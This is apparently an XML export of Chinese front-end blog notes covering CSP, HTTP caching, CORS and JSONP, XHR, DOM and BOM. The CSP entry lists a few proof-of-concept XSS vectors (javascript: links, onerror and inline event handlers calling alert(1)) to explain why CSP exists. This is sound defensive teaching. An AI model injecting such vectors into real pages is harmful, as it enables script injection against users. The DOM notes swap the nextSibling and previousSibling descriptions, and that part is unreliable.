标签内]]></content>
      <categories>
        <category>性能</category>
      </categories>
      <tags>
        <tag>性能</tag>
        <tag>基础性能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全-CSP（内容安全策略）]]></title>
    <url>%2F2018%2F04%2F17%2F%E5%AE%89%E5%85%A8_CSP%EF%BC%88%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[CSP (内容安全策略)CSP [Content Security Policy] 译为：内容安全策略 CSP的目的XSS(Cross Site Scripting) 跨站脚本攻击是最常见也是危害最大的攻击手段，我们前端能够做一些能力范围内的处理，比如最简单的将表单内容脚本序列化为HTML实体，以防止恶意脚本的执行，但除此之外，还有很多跨站脚本攻击的方式，如下： 12345&lt;a href="javascript:alert(1)"&gt;&lt;/a&gt;&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;&lt;img src="x" onerror="alert(1)" style=""&gt;&lt;video src="x" onerror="alert(1)"&gt;&lt;/video&gt;&lt;div onclick="alert(1)" onmouseover="alert(2)"&gt;&lt;div&gt;&lt;/div&gt;&lt;/div&gt; 利用 javascript:.. 以及 内联事件进行攻击。 为了阻止这些攻击，我们前端也要做不少相应的工作，于是很多人提出能不能从根本上解决问题，让浏览器帮我们做这些事情，这就是 CSP 提出的原因和要解决的问题。 CSP 的原理以及开启方式原理原理其实就是白名单机制，开发者明确告诉客户端(浏览器)哪些资源可以加载并执行，我们只需要提供配置，其他的工作由客户端(浏览器)来完成。 开启CSP的方式一、通过 &lt;meta&gt; 标签开启 1&lt;meta http-equiv="Content-Security-Policy" content="配置项" &gt; 二、通过添加 Content-Security-Policy 响应头字段 可配置的选项1234567891011121314151617181920default-src：用来设置每个选项的默认值script-src：外部脚本style-src：样式表img-src：图像media-src：媒体文件（音频和视频）font-src：字体文件object-src：插件（比如 Flash）child-src：框架frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）worker-src：worker脚本manifest-src：manifest 文件block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议plugin-types：限制可以使用的插件格式sandbox：浏览器行为的限制，比如不能有弹出窗口等。report-uri：有时，我们不仅希望浏览器帮我们防止XSS的攻击，还希望将该行为上报到给定的网址，该选项用来配置上报的地址 选项的值每个限制选项可以设置以下几种值 主机名：example.org，https://example.com:443 路径名：example.org/resources/js/ 通配符：*.example.org，*://*.example.com:*（表示任意协议、任意子域名、任意端口） 协议名：https:、data: 关键字’self’：当前域名，需要加引号 关键字’none’：禁止加载任何外部资源，需要加引号 例子1&lt;meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"&gt; 上面代码中，CSP 做了如下配置： 脚本：只信任当前域名 &lt;object&gt; 标签：不信任任何URL，即不加载任何资源 样式表：只信任 cdn.example.org 和 third-party.org 框架（frame）：必须使用HTTPS协议加载 其他资源：没有限制]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>CSP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络-RESTFul_API指南]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BD%91%E7%BB%9C_RESTFul_API%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>RESTFul</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络-强缓存与协商缓存]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BD%91%E7%BB%9C_%E5%BC%BA%E7%BC%93%E5%AD%98%E4%B8%8E%E5%8D%8F%E5%95%86%E7%BC%93%E5%AD%98%2F</url>
    <content type="text"><![CDATA[强缓存与协商缓存浏览器缓存策略请求资源时缓存的应用过程 浏览器在加载资源时根据 http header 判断是否命中强缓存，如果命中，则直接使用缓存里的资源，不会发送请求到服务器。 如果没有命中强缓存，浏览器会发送请求到服务器，服务器根据 http header 判断是否命中协商缓存，如果命中则浏览器会响应这个请求，但不会反悔资源，会告诉浏览器使用缓存里的资源。 如果协商缓存也没有命中，那么正常响应请求，返回资源。 强缓存和协商缓存的区别与联系区别：命中强缓存不会发送请求到服务器，但是协商缓存需要向服务器发送请求(因为是否命中协商缓存由服务器判断) 共同点：都是从浏览器的缓存中获取资源 强缓存开启强缓存需要 http 响应头中包含指定的字段：Expires 或 Cache-Control。 ExpiresExpires 的特点Expires 是 http1.0 提出一个表示资源过期的 respone header 字段，他有以下特点： 返回的是绝对时间。 GMT格式的字符串表示，如：Thu, 31 Dec 2037 23:55:55 GMT Expires 的原理Expires 字段的原理是：浏览器第一次请求资源的时候，服务器在 respone header 中添加 Expires 字段，浏览器将请求回来的资源以及 respone header 一并存到缓存中，当浏览器再次请求这个资源的时候，先从缓存中找到该资源，然后拿到上次缓存的 Expires 字段的值，与当前请求的时间作比较，如果发现当前请求的时间晚于上一次换粗的 Expires 字段的值，说明缓存失效了，重新请求资源，并更新 Expires 字段的值。 Expires 存在的问题在介绍 Expires 的特点时我们知道，Expires 字段的值代表未来的一个绝对时间，比如 2018年1月1日，这会有什么问题呢？其实很明显，如果我本机时间与服务器时间相差较大的时候，Expires 过期很容易失效了。 Cache-ControlCache-Control 的特点正因为 Expires 的绝对时间存在上述的问题，http1.1 提出了一个新的 respone header 即：Cache-Control，它具有以下特点： 返回的是相对时间 可以通过 Cache-Control 字段的属性值 max-age 配置缓存的时间长度，单位是秒，如下： 1Cache-Control:max-age=315360000 Cache-Control 的原理Cache-Control 缓存的原理与 Expires 类似，区别在于过期判断： Expires 是使用本机时间与服务器返回的一个绝对时间对比，这会出问题，上面也有讲过 Cache-Control 则不同，它是使用上一次请求的时间加上设置的相对时间，计算出一个过期时间，与本次请求的时间作对比，使用的时间都是本机时间。 注意事项Expires 与 Cache-Control 可以同时存在于 respone header，Cache-Control 的优先级高于 Expires。 协商缓存浏览器自身就可以判断是否命中强缓存，但是协商缓存是由服务器来判断的，所以当强缓存没有命中后，浏览器会发送请求到服务器，服务器根据相应的 http header 判断是否命中协商缓存。如果命中协商缓存，则响应头的状态码为 304 即未改变(Not Modified)，告诉浏览器使用缓存中的资源。 开启协商缓存有两种方案： 请求头：If-Modified-Since 配合 响应头：Last-Modified 请求头：If-None-Match 配合 响应头：ETag Last-Modified / If-Modified-Since原理 当浏览器第一次向服务器请求资源时，服务器在响应头中会添加 Last-Modified 字段，该字段的值代表资源的最后一次修改时间。 浏览器再向服务器发送请求时，会在请求头部添加字段：If-Modified-Since，该字段的值为之前缓存下来的 Last-Modified 的值。 服务器拿到 If-Modified-Since 的值进行对比，如果一致则命中协商缓存，返回 304 状态码，告诉浏览器从缓存中获取资源。 如果没有命中协商缓存，则正常返回资源，以及新的 Last-Modified 值，浏览器进行更新。 注意：在命中协商缓存的情况下，服务器不会在响应头中添加：Last-Modified 字段，因为没有必要。 缺点有的时候会出现这种情况：资源实际已经被修改了，但是他的最后修改时间没有变，这就会导致新的资源无法得到更新 ETag / If-None-Match正如 Last-Modified / If-Modified-Since 的缺点所描述的那样，为了避免这个问题，就有了 ETag / If-None-Match。 原理原理类似于 Last-Modified / If-Modified-Since，不同的时候，ETag 不是资源的最后修改时间，而是服务器根据当前请求的资源生成的唯一标示，是一个字符串。 Last-Modified 与 ETag 的对比字段值 Last-Modified 是资源的最后修改时间 ETag 是当前请求的资源的唯一标示字符串 命中缓存后是否最为响应头返回 如果命中协商缓存，Last-Modified 并不会最为响应头返回，因为没有必要 如果命中协商缓存，ETag 仍然会作为响应头返回，因为不管资源有没有改变，资源的唯一标示又重新生成了。 如何利用缓存（待续…）]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络-跨域与跨域的解决方案]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BD%91%E7%BB%9C_%E8%B7%A8%E5%9F%9F%E4%B8%8E%E8%B7%A8%E5%9F%9F%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[跨域同源策略定义同源策略指三个相同：协议相同、域名相同、端口相同，有一个不同即非同源。 主域与子域、域名与域名对应的IP。都是非同源的 意义同源策略可以算是web安全的基石，没有同源策略就么有安全可言。 非同源的限制 无法共享 cookie/Storage/indexDB 无法操作彼此的 DOM 无法发送 ajax 请求 无法通过 flash 发送 http 请求 跨域请求的方法JSONP 原理：JSONP 的原理是利用 &lt;script&gt; 标签的 src 属性加载资源不受同源策略影响，其本质是向服务端请求一段 js 代码。 实现： 1234let scriptTag = document.createElement('script')// 其中cb是回调函数参数的名字，cbname是回调函数的名字，这两个名字要与服务端沟通定义scriptTag.src = 'http://hcysun.me/xxx?cb=cbname'document.body.appendChild(scriptTag) 优点 1、可跨域 2、兼容性好，基本全部兼容 缺点 只支持 GET 请求 确定JSONP请求是否失败并不容易，一般根据超时时间来判断 CORS全称是：Cross-Origin Resource Sharing（跨域资源共享） 原理： 1、当浏览器发现我们的XHR请求不符合同源策略时，会在请求头添加 Origin 字段，代表请求的来源 2、服务端需要处理请求头部的 Origin 字段，根据情况在响应头中添加 Access-Control-Allow-Origin Access-Control-Allow-Methods Access-Control-Allow-Headers等头部信息 缺点 兼容性问题，他是现代浏览器支持的一种跨域资源请求的一种方式 iframe中跨域请求的方法跨文档通信API（postMessage）123456789// Page Fooiframe.contentWindow.postMessage('Hello from foo', '/path/to/bar')// Page Barwindow.parent.addEventListener('message', function (e) &#123; console.log(e.source) // 发送消息的窗口 console.log(e.origin) // 消息发向的网址 console.log(e.data) // 消息内容&#125;) 片段标识符（hash值）父级页面虽然不能操作 iframe 的 window 和 DOM，但是可以修改 iframe 的 URL，通过修改 hash 值（即：location.hash），监听 hashchange 事件进行跨文档通信 window.name]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络-ajax及其优缺点]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BD%91%E7%BB%9C_ajax%E5%8F%8A%E5%85%B6%E4%BC%98%E7%BC%BA%E7%82%B9%2F</url>
    <content type="text"><![CDATA[ajax本文将不会讨论IE7之前版本浏览器的兼容实现，以标准的 XMLHttpRequest 实现 小例子演示 XHR 的使用为了更好的演示，我们将会结合 Nodejs 实现一个简单的服务器端程序，假设我们有如下文件： index.html —- 首页 app.js —- Nodejs 编写的处理请求的程序 ajax.js —- 被 index.html 引用的 js 文件，用来测试 XHR 代码 test.txt —- 存储数据，供XHR请求 来看一下 app.js 的代码： 12345678910111213141516171819202122232425const http = require('http')const fs = require('fs')const path = require('path')// 创建一个 sever 对象，监听 9090 端口http.createServer((request, response) =&gt; &#123; // 分析请求的资源路径 let reqUrl = request.url === '/' ? '/index.html' : request.url let extName = path.extname(reqUrl) let fileName = path.basename(reqUrl, extName) extName = extName ? extName.substring(1) : 'html' // 根据分析请求的资源，返回相应的mime类型 response.writeHead(200, &#123; 'Content-Type': `text/$&#123;extName&#125;` &#125;) // 如果请求的不是 favicon.ico 就将资源返回 if (reqUrl !== '/favicon.ico') &#123; response.end(fs.readFileSync('.' + reqUrl)) &#125;&#125;).listen(9090)console.log('Server running at http://127.0.0.1:9090/') 上面的代码是一段很简单的node程序，根据请求的资源返回相应的内容。此时在终端执行： 1node app.js 访问：http://127.0.0.1:9090/ ，我们将看到 index.html 的内容，因为 app.js 中我们做了如下处理： 1let reqUrl = request.url === '/' ? '/index.html' : request.url 如果请求的根路径 /，那么返回 /index.html 的内容。 再来看看 index.html 的内容： 1234567891011&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;test ajax&lt;/title&gt; &lt;/head&gt; &lt;body&gt; test ajax &lt;script src="ajax.js"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 简单的不得了，仅仅引用了 ajax.js 文件。 这个时候，我们的服务端程序会接收到对 ajax.js 文件的请求，我们做了正确的处理并返回。 最后，我们还需要一个 test.txt 文件，我们随意写一些内容然后保存，比如我们写一句话： 12// test.txtThis is a test file 下面，我们就可以使用 XHR 来请求 test.txt 的内容了。 编辑 ajax.js 文件，最简单的 XHR 使用仅仅需要三行代码，如下： 123var xhr = new XMLHttpRequest()xhr.open('get', 'test.txt')xhr.send() 首先实例化 XMLHttpRequest 对象，然后调用实例的 open 方法打开一个连接，最后调用 send 方法发送请求。注意：调用 open 方法并不会发送请求。 open 方法接受三个参数：1、要发送请求的方法类型。2、请求的URL。3、一个boolean值，代表是否异步。如果不传第三个参数，默认是异步的。 重启服务，发现控制台会有如下输出： 证明我们的请求成功了，但是我们还没有能够获取到数据，那么如何获取到数据呢？实际上，如果请求成功且数据成功返回，那么数据会自动填充到 xhr 对象的相应属性下，我们需要注意的 xhr 属性如下： xhr.responseText —- 作为响应主体被返回的文本 xhr.responseXML —- 如果响应的内容类型(Content-Type)为 text/xml 或者 application/xml，那么这个属性将保存着响应数据的 XML DOM 文档。 status —- 响应的 HTTP 状态码 statusText —- 相应状态码的文字说明 如果请求是异步的，那么还需要注意如下属性： readyState —- 该属性是一个 Number 类型值，分别为：0，1，2，3，4。代表请求/响应的不同阶段： 0：未初始化，即还没有调用 open 方法 1：启动，已经调用 open，但还没有调用 send 2：发送，已经调用 send，但还没有接收到响应 3：接收，已经接收到数据，但还没有接收完成 4：完成，已经接收完成，数据可用了 异步的情况下，除了要注意 readyState 属性外，还需要一个事件，因为我们需要在这个事件处理程序中操作数据，这个事件的名字叫做：readystatechange，顾名思义，这个事件代表着当 readyState 变化时触发。一般请求下，我们只考虑 readyState 值变为 4 的阶段，因为这个阶段的数据已经接收完成，且可以使用了。 那么针对之前的例子，我们只需要添加如下代码，就可以获取到请求的数据： 12345678910111213var xhr = new XMLHttpRequest()xhr.addEventListener('readystatechange', function (event) &#123; if (xhr.readyState === 4) &#123; if ((xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300) || xhr.status === 304) &#123; console.log(xhr.responseText) &#125; else &#123; console.log(xhr.status) &#125; &#125;&#125;)xhr.open('get', 'test.txt')xhr.send() 我们通过 addEventListener 给 xhr 对象添加了 readystatechange 事件，并在里面作如下判断： 当 xhr.readyState 状态等于 4 时才要处理数据，接着判断状态码，只有状态码 在区间 [200, 300) 时或者等于 304 时才代表获取数据成功，正常显示数据，否则将状态码打印出来。 另外要注意，该事件必须要在调用 open 方法之前设置。 刷新页面，我们能看到数据已经得到了： XHR 属性、方法、事件 汇总一下列出的属性、方法以及事件，包含XHR1级以及2级的全部规范内容，由于浏览器对2级规范的实现并不完善，所以对于XHR2级规范会标注出来。 属性responseText 描述：保存中响应主体返回的文本 类型：String responseXML 描述：如果响应的内容类型(Content-Type)为 text/xml 或者 application/xml 那么这个属性保存着包含响应内容的XML DOM文档。 status 描述：响应的HTTP状态码，如：200、304 等 类型：Number statusText 描述：对 status 状态码的文本描述 类型：String readyState 描述：一个数字，标示着当前请求/响应的某一个阶段 0：未初始化，即还没有调用 open 方法 1：启动，已经调用 open，但还没有调用 send 2：发送，已经调用 send，但还没有接收到响应 3：接收，已经接收到数据，但还没有接收完成 4：完成，已经接收完成，数据可用了 类型：Number 【XHR2】timeout 描述：可以给 xhr.timeout 属性设置一个数字值，代表请求多少毫秒之后超时，超时后将触发同样是XHR2级规范定义的 timeout 事件。 示例：1xhr.timeout = 1000 // 1秒后超时 upload 描述：xhr.upload 属性返回一个 XMLHttpRequestUpload 对象，用来表示上传的进度，该对象是不透明的，可以通过为其绑定事件来跟踪进度。 示例： 12345678910111213141516const xhr = new XMLHttpRequest()xhr.open('POST', url)xhr.onreadystatechange = () =&#123; // ...&#125;xhr.upload.addEventListener('progress', event =&gt; &#123; // event.lengthComputable 文件是否可计算 if (event.lengthComputable) &#123; // 计算上传进度百分比 let percentage = Math.round(event.loaded / event.total * 100) &#125; else &#123; console.log('无法计算') &#125;&#125;)xhr.upload.addEventListener('load', () =&gt; &#123;&#125;)xhr.upload.addEventListener('error', () =&gt; &#123;&#125;) 能够在 xhr.upload 上监听的事件有： 事件 描述 loadstart 开始上传 progress 传输中 abort 终止操作 error 失败 load 成功 timeout 超时 loadend 完成（不论成功与否） 方法open(method, url[, async]) 描述：启动一个请求，但不会发送。 参数： {String} method 请求的方法，如：get、post 等 {String} url 请求的URL {Boolean} async 一个布尔值，代表着是否异步发送请求，默认 true 异步 send(data) 描述：发送通过 open 方法启动的请求 参数： {String/FormData} data 作为请求主体发送的数据 【XHR2】扩展：XHR2允许给 send 方法传递一个 FormData 实例。FormData 接收一个可选的参数，参数为 form 表单元素，如下： 12var form = document.forms[0]var data = new FormData(form) 在XHR1级的时候，我们要手动序列化表单的数据然后构造一个合适的字符串。而 FormData 会自动序列化表单，用于创建与表单格式相同的数据用于XHR传输，这样服务端接收数据的时候就能够对传统的表单提交一视同仁，为我们节省了不少事情。 FormData 除了上述好处之外，也不需要我们手动设置请求头部，在XHR1级的时候，除了手动序列化表单，为了模拟真正的表单提交，我们需要设置相应的请求头部信息才行，比如： 1xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded') setRequestHeader(key, val) 描述：设置要发送的请求头部信息 参数： {String} key 头部字段的名称 {String} val 头部字段的值 注意：该方法必须要在调用 open 方法之后且调用 send 方法之前发送才能生效 getResponseHeader(key) 描述：根据指定的响应头部字段名称，获取响应头部字段的值 参数： {String} key 响应头部字段的名称 getAllResponseHeaders() 描述：获取所有头部信息作为一个长字符串 示例：如第一小节的例子中，调用该方法将得到如下内容： 1234Date: Fri, 09 Jun 2017 08:37:44 GMTConnection: keep-aliveTransfer-Encoding: chunkedContent-Type: text/txt 【XHR2】overrideMimeType() 描述：重写响应数据的mime类型 意义：我们知道 xhr 对象拥有 responseXML 属性，当服务端返回的数据的内容类型是 text/xml 或 application/xml 时，数据将最为XML DOM保存在 responseXML 属性中，但是，如果服务端响应的内容类型是：text/plain，而事实上数据确实是可以作为 XML 解析的，此时 responseXML 属性为空，为了重新让该属性保存着能够用于 XML 解析的数据，我们就可以使用 overrideMimeType 方法重写mime类型： 1234var xhr = new XMLHttpRequest()xhr.open('get', 'xml.php')xhr.overrideMimeType('text/xml')xhr.send() 事件readystatechange 描述：当 xhr.readyState 属性值变化时触发。 注意：该事件必须要在调用 open 方法之前设置 【XHR2】timeout 描述：当请求在 xhr.timeout 属性所设置的规定事件内没有完成，将触发该事件，代表请求超时 进度事件loadstart 描述：接收到响应数据的第一个字节时触发 progress 描述：接收响应数据期间持续触发 事件对象的重要属性： event.lengthComputable —- 一个boolean值，表示进度信息是否可用 event.position —- 表示已经接收的字节数 event.totalSize —- 表示根据 Content-Length 响应头部确定的预期字节数 error 描述：请求发生错误时触发 abort 描述：调用 xhr.abort() 方法终止连接时触发 load 描述：响应数据接受完毕时触发 注意：实际上 load 事件是为了取代 readystatechange 事件而定义的，load 事件的好处是，我们不需要手动判断 readyState 属性的值。 loadend 描述：触发 error、abort、load 事件后触发 ajax的优缺点ajax的优点 无刷新更新数据，不影响用户交互 传统方式每次与服务器交互都返回整个HTML页面内容，ajax仅获取必要的数据，减少带宽 ajax是前后端分离能够实现的重要桥梁 ajax的缺点 越过浏览器的历史记录，页面无法返回前一个状态 不利于搜索引擎优化(SEO)]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>ajax</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络-从输入URL到页面加载完成的过程]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BD%91%E7%BB%9C_%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%8A%A0%E8%BD%BD%E5%AE%8C%E6%88%90%E7%9A%84%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[从输入URL到页面加载完成的过程中都发生了什么事情？解析URL当你在浏览器中输入URL并敲回车之后，浏览器会把URL分成几部分： 1、协议：从计算机获取资源的方式，常见的HTTP、FTP等 2、网络地址：域名或者IP，指示网络中的哪一台计算机 3、资源路径：指示在该计算机上获取哪一个资源 DNS域名解析当浏览器发现网络地址并不是IP，而是域名的时候，浏览器会向DNS服务器发送请求，查找域名对应的IP，如果该DNS服务器没有找到该域名对应的IP，那吗会向上级请求，直到根节点，结果只有两个：要吗找到了，要吗找不到。（你电脑里的网络设置里面有DNS的服务器IP） 扩展：例如百度、淘宝这些访问量及其大的网站，在DNS域名解析时，在不同的区域或不同网络下解析出来的IP可能是不同的，这就涉及负载均衡的第一步：在DNS解析域名时，将你的访问分配到不同的入口，同时尽可能保证你访问的入口是在所有入口中可能较快的一个。 确定端口如果网络地址中不包含端口，那么会使用协议默认的端口。HTTP协议默认端口是80，HTTPS协议默认端口是443 发送HTTP请求当浏览器对域名完成一系列的解析之后，就会构建一个HTTP请求，HTTP属于应用层协议，真正的数据传输是传输层协议TCP完成的，这就涉及到TCP建立连接的“三次握手”： 1、发送端发送带有 SYN 标志的数据包给接收端，并在一定的延迟时间内等待回复 2、接收端收到数据包后传回一个带有 SYN/ACK 标志的数据包以示确认传达信息 3、发送端收到信息后还会发送一个带有 ACK 标志的数据包给接收端以示握手成功，连接建立完成 服务器处理并响应请求服务器收到客户端发送的HTTP请求后，分析请求报文，并查找相应的请求资源，并返回响应报文。 响应报文中包含一个重要的信息，状态吗： 常见的 4 开头的状态吗一般表示请求出了问题，如 404 表示请求的资源不存在3 开头的状态吗一般表示重定向，如 301表示永久重定向5 开头的状态吗一般表示服务器出了问题，如 500 表示服务器出错2 开头的一般代码成功，如 200 页面渲染请查看 浏览器渲染页面的过程]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络-get和post的区别]]></title>
    <url>%2F2018%2F04%2F17%2F%E7%BD%91%E7%BB%9C_get%E5%92%8Cpost%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[get 请求和 post 请求的区别传递数据的方式get 通过 URL 或 cookie 传参 post 将数据放到请求体(BODY) 中 传递数据的大小get 的URL长度有限制 post 则可以传递大量的数据 安全性get 传递的参数会暴露在 URL 中 post 则不会 另外注意 GET 请求的参数会保存在浏览器的历史记录中]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>API</tag>
        <tag>get</tag>
        <tag>post</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BOM详解]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_BOM%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[概念BOM 主要处理浏览器窗口和框架，不过通常浏览器特定的JavaScript 扩展都被看做 BOM 的一部分。这些扩展包括： 弹出新的浏览器窗口 移动、关闭浏览器窗口以及调整窗口大小 提供 Web 浏览器详细信息的定位对象 提供用户屏幕分辨率详细信息的屏幕对象 对 cookie 的支持 IE 扩展了 BOM，加入了 ActiveXObject 类，可以通过 JavaScript 实例化 ActiveX 对象 认识BOMBOM的核心是window，而window对象又具有双重角色，它既是通过js访问浏览器窗口的一个接口，又是一个Global（全局）对象。这意味着在网页中定义的任何对象，变量和函数，都以window作为其Global对象。 一张图说明window对象]]></content>
      <categories>
        <category>ECMA</category>
      </categories>
      <tags>
        <tag>ECMA</tag>
        <tag>BOM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ECMA-DOM详解]]></title>
    <url>%2F2018%2F04%2F17%2FECMA_DOM%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[一、节点概览DOM文档对象模型概念：DOM的目的是为使用JavaScript操作DOM提供编程接口 节点类型全部的节点类型Node构造函数的属性，也是节点属性 nodeType 的值 123456789101112131415161718ELEMENT_NODE----1ATTRIBUTE_NODE----2TEXT_NODE----3CDATA_SECTION_NODE----4ENTITY_REFERENCE_NODE----5ENTITY_NODE----6PROCESSING_INSTRUCTION_NODE----7COMMENT_NODE----8DOCUMENT_NODE----9DOCUMENT_TYPE_NODE----10DOCUMENT_FRAGMENT_NODE----11NOTATION_NODE----12DOCUMENT_POSITION_DISCONNECTED----1DOCUMENT_POSITION_PRECEDING----2DOCUMENT_POSITION_FOLLOWING----4DOCUMENT_POSITION_CONTAINS----8DOCUMENT_POSITION_CONTAINED_BY----16DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC----32 常用节点类型123456DOCUMENT_NODE ---- 9 (window.document)ELEMENT_NODE ---- 1 (&lt;body&gt; &lt;p&gt; 等标签元素)ATTRIBUTE_NODE ---- 2 (class=&quot;test&quot;)TEXT_BODE ---- 3 (文本节点)DOCUMENT_FRAGMENT_NODE ---- 11 (document.createDocumentFragment())DOCUMENT_TYPE_NODE ---- 10 (&lt;!DOCUMENT html&gt;) 节点继承链所有节点类型都继承自Node，并且这个继承链可能更长 12345Object -&gt; EventTarget -&gt; Node -&gt; Element -&gt; HTMLElement -&gt; HTML*ElementObject -&gt; EventTarget -&gt; Node -&gt; Attr (DOM4 弃用)Object -&gt; EventTarget -&gt; Node -&gt; CharacterData -&gt; TextObject -&gt; EventTarget -&gt; Node -&gt; Document -&gt; HTMLDocumentObject -&gt; EventTarget -&gt; Node -&gt; DocumentFragment 继承链中的每一个环节都为最终的节点类型提供了大量的属性和方法 节点属性nodeType 读写特性：只读 描述：节点的类型，返回以上常量值 nodeName 读写特性：只读 描述：节点名字，该属性的返回值根据节点类型不同而异：12345元素节点返回标签名，与 tagName 值相同文本节点返回 #textComment 节点返回 #commentDocument 返回 #documentDocumentFragment 返回 #document-fragment nodeValue 读写特性：读写 描述： 除了 Text 和 Comment 节点以及 Attr 节点，所有节点的 nodeValue 都返回 null nodeValue 的作用就是获取 Text 和 Comment 节点的实际文本字符串，也可以通过设置 nodeValue 的值修改 这两个节点内的文本内容 innerHTML 读写特性：读写 描述： 读：读取元素节点的内容(标签和文本)作为JavaScript字符串 写：设置元素节点的内容(标签将被解析为真正的HTML元素)。 注意：因为 innerHTML 会调用一个沉重且高消耗的HTML解析器。所以慎用 outerHTML 读写特性：读写 描述： 读：读取包含元素本身及其内容作为JavaScript字符串 写：设置的内容将替换自身标签将被解析为真正的HTML元素() textContent 读写特性：读写 描述： 读：获取元素节点内所有文本节点的值，包括其子元素节点的文本节点 写：将JavaScript字符串创建为文本节点作为该元素的子节点(原有的所有子节点将被删除) 注意：在 文档节点(document) 或 文档类型节点(document.doctype) 调用 textContent 返回 null textContent 属性也能返回 &lt;script&gt; &lt;style&gt; 标签的内容 childNodes 读写特性：只读 描述： 返回调用该方法的元素下所有“直属”子节点。包括元素节点，文本节点，注释节点等等所有节点。 返回的集合是 NodeList parentNode 读写特性：只读 描述：返回调用该方法的节点的父节点 firstChild 读写特性：只读 描述：返回调用该方法的节点的第一个子节点 lastChild 读写特性：只读 描述：返回调用该方法的节点的最后一个子节点 nextSibling 读写特性：只读 描述：返回调用该方法的节点的前一个兄弟节点 previousSibling 读写特性：只读 描述：返回调用该方法的节点的后一个兄弟节点 children 读写特性：只读 描述：返回调用该方法的所有元素子节点 parentElement 读写特性：只读 描述：返回调用该方法的节点的父元素节点 firstElementChild 读写特性：只读 描述：返回调用该方法的节点的第一个“元素”子节点 lastElementChuild 读写特性：只读 描述：返回调用该方法的节点的最后一个“元素”子节点 nextElementSibling 读写特性：只读 描述：返回调用该方法的节点的下一个兄弟“元素”节点 previousElementSibling 读写特性：只读 描述：返回调用该方法的节点的前一个兄弟“元素”节点 ownerDocument 读写特性：只读 描述：返回该节点所在的 document 对象，document.ownerDocument === null 节点方法insertAdjacentHTML(position, text) 描述： 指定在 开标签前后 或者 闭标签前后 插入HTML文本。 参数： {String} position 插入的位置： beforebegin 开标签前 afterbegin 开标签后 beforeend 闭标签前 afterend 闭标签后 {String} text 插入的内容，字符串。与 innerHTML的行为相同 延伸： 除火狐浏览器外，所有现代浏览器都可以使用下面两个方法： insertAdjacentElement(): insertAdjacentText(): appendChild(element) 描述：将指定节点插入到调用该方法的子节点末尾 参数： {Element} element 要插入的节点 返回值： {Element} 被插入的节点 insertBefore(element, target) 描述：在调用该方法的元素的指定子节点之前插入所给节点，如果省略第二个参数，那么行为与appendChild相同 参数： {Element} element 要插入的节点 {Element} target 想要在哪个节点之前插入的该节点的引用 返回值： {Element} 被插入的节点 removeChild(element): 描述：移除调用该方法的元素的子节点 参数： {Element} element 要移除的子节点 返回值： {Element} 被移除节点的引用 replaceChild(element, target) 描述：使用新节点替换调用该方法的元素的指定子节点 参数： {Element} element 新子节点 {Element} target 要替换的子节点 返回值： {Element} 被替换节点的引用 cloneNode(deep) 描述：深/浅 复制调用该方法的节点 参数： {Boolean} deep true表示深复制，false表示浅复制，默认为false 返回值： {Element} 克隆的节点 注意：无论深复制还是浅复制，都只会复制节点的内联事件，任何通过 addEventListener 或 onxxx 添加的事件都不会被复制 contains(element) 描述：判断调用该方法的节点是否包含给定的节点 参数： {Element} element 节点 返回值： {Boolean} ture 包含，fals 不包含 compareDocumentPosition(element) 描述：对比传入节点和调用该方法的节点的位置。 参数： {Element} element 节点 返回值： {Number} 数字，口诀如下：该口诀中的位置是 传入节点 相对于 调用该方法节点 的前2后4里20，同0外10不在1 节点集合NodeList 或 HTMLCollection 特点： 类数组对象 拥有 length 属性 实时节点树，每当文档结构发生变化时，他们都会得到更新 集合的节点顺序与节点所在树中的顺序相同(深度优先) 123456可以将节点集合(NodeList 或 